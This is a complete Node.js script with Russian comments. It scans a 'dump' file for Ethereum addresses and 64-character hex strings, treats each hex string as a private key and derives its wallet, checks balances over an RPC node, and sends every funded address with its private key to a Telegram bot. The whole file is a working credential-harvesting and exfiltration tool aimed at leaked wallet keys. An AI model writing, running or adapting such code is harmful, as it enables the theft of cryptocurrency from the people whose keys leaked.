const fs = require('fs');
const axios = require('axios');
const { ethers } = require('ethers');
require('dotenv').config();

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const RPC = process.env.RPC_ETH;

const filePath = './sample_dump.txt'; // Имя файла с дампом

function sendToTelegram(message) {
  const text = encodeURIComponent(message);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
  axios.get(url).catch(err => console.log("Telegram error:", err.message));
}

async function checkAddressBalance(address, key = null) {
  const provider = new ethers.JsonRpcProvider(RPC);
  try {
    const balance = await provider.getBalance(address);
    const eth = parseFloat(ethers.formatEther(balance));
    if (eth > 0) {
      const msg = `Найден активный адрес: ${address}\nБаланс: ${eth} ETH${key ? `\nКлюч: ${key}` : ''}`;
      console.log(msg);
      sendToTelegram(msg);
    }
  } catch (err) {
    console.error("RPC error:", err.message);
  }
}

function parseDumpAndScan() {
  const content = fs.readFileSync(filePath, 'utf8');

  const regexAddress = /0x[a-fA-F0-9]{40}/g;
  const regexKey = /[a-fA-F0-9]{64}/g;

  const addresses = content.match(regexAddress) || [];
  const privateKeys = content.match(regexKey) || [];

  const unique = new Set();

  addresses.forEach(addr => {
    if (!unique.has(addr)) {
      unique.add(addr);
      checkAddressBalance(addr);
    }
  });

  privateKeys.forEach(pk => {
    try {
      const wallet = new ethers.Wallet(pk);
      if (!unique.has(wallet.address)) {
        unique.add(wallet.address);
        checkAddressBalance(wallet.address, pk);
      }
    } catch {}
  });
}

parseDumpAndScan();
